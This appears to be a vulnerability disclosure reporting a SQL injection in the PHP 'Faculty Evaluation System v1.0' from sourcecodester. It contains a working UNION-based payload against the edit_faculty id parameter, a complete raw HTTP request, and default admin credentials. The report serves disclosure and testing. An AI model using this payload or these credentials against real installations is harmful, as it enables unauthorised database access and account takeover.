# Faculty Evaluation System v1.0 by oretnom23 has SQL injection

Admin account password： admin@admin.com/admin123
 
BUG_Author: acmglz

vendors: https://www.sourcecodester.com/php/14635/faculty-evaluation-system-using-phpmysqli-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /eval/index.php?page=edit_faculty&id=

Vulnerability location: /eval/index.php?page=edit_faculty&id=, id

dbname =evaluation_db

[+] Payload: /eval/index.php?page=edit_faculty&id=-1%20union%20select%201,database(),3,4,5,6,7,8--+ // Leak place ---> id

```sql
GET /eval/index.php?page=edit_faculty&id=-1%20union%20select%201,database(),3,4,5,6,7,8--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=lrrse02i69soj9l3lnarhnd9ck
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/233827338-31bc5945-5a83-4c3b-ade0-978cbe35d99d.png)
